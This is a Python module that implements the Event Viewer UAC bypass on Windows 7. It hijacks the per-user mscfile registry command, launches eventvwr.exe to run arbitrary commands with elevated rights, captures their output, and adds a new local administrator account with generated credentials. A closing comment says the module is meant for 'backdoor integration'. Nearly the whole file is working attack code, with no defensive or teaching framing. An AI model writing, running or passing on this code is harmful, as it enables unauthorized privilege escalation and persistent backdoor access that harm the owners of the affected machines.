import os
import subprocess
import time
import winreg
import tempfile
import ctypes
import random

class Windows7PrivilegeEscalator:
    """Windows 7 privilege escalation using Event Viewer UAC bypass"""
    
    def __init__(self):
        pass
    
    def eventvwr_uac_bypass_confirmed(self, payload_command):
        """Core Event Viewer UAC bypass"""
        try:
            reg_path = r"Software\Classes\mscfile\shell\open\command"
            
            # Backup original value if exists
            original_value = None
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ)
                original_value, _ = winreg.QueryValueEx(key, "")
                winreg.CloseKey(key)
            except:
                pass
            
            # Set registry hijack
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_command)
            winreg.CloseKey(key)
            
            # Launch eventvwr.exe for auto-elevation
            subprocess.Popen("eventvwr.exe", shell=True)
            
            # Wait for execution
            time.sleep(12)
            
            # Restore registry
            try:
                if original_value:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
                    winreg.CloseKey(key)
                else:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
            except:
                pass
            
            return True
            
        except Exception as e:
            return False
    
    def execute_admin_command(self, command):
        """Execute admin command and capture actual output"""
        # Create output file for command results
        output_file = os.path.join(tempfile.gettempdir(), f"admin_output_{int(time.time())}.txt")
        
        # Create payload that captures command output
        payload = f'cmd.exe /c "{command} > {output_file} 2>&1"'
        
        # Execute using UAC bypass
        success = self.eventvwr_uac_bypass_confirmed(payload)
        
        if success:
            time.sleep(8)  # Wait for command execution
            
            # Read actual command output
            if os.path.exists(output_file):
                try:
                    with open(output_file, 'r', encoding='utf-8', errors='ignore') as f:
                        actual_output = f.read().strip()
                    os.remove(output_file)
                    
                    if actual_output:
                        return True, actual_output
                    else:
                        return True, "Command executed successfully (no output)"
                        
                except Exception as e:
                    return True, f"Command executed but couldn't read output: {e}"
            else:
                return False, "Command execution not confirmed - no output file created"
        else:
            return False, "UAC bypass failed"
    
    def create_admin_user(self, username=None, password=None):
        """Create admin user - AUTO-GENERATES credentials"""
        # Auto-generate credentials if not provided
        if not username:
            username = f"admin{random.randint(10, 99)}"
        if not password:
            password = f"Pass{random.randint(100, 999)}!"
        
        # Create user
        user_success, _ = self.execute_admin_command(f"net user {username} {password} /add")
        if not user_success:
            return False, None, None, "Failed to create user"
        
        # Add to admin group
        admin_success, _ = self.execute_admin_command(f"net localgroup administrators {username} /add")
        if not admin_success:
            return False, username, password, "User created but failed to add to admin group"
        
        # Verify user exists
        time.sleep(3)
        try:
            check = subprocess.run(f"net user {username}", shell=True, capture_output=True, text=True, timeout=10)
            if check.returncode == 0:
                return True, username, password, "Admin user created successfully"
            else:
                return False, username, password, "User creation verification failed"
        except:
            return False, username, password, "User verification error"
    
# Standalone functions for backward compatibility
def eventvwr_uac_bypass_confirmed(payload_command):
    """Standalone function for compatibility"""
    escalator = Windows7PrivilegeEscalator()
    return escalator.eventvwr_uac_bypass_confirmed(payload_command)

def execute_admin_command(command):
    """Standalone function for compatibility"""
    escalator = Windows7PrivilegeEscalator()
    success, message = escalator.execute_admin_command(command)
    return success

def create_admin_user_detailed(username=None, password=None):
    """Standalone function for compatibility"""
    escalator = Windows7PrivilegeEscalator()
    return escalator.create_admin_user(username, password)

# Create instance function for backdoor integration
def create_windows7_privilege_escalator():
    return Windows7PrivilegeEscalator()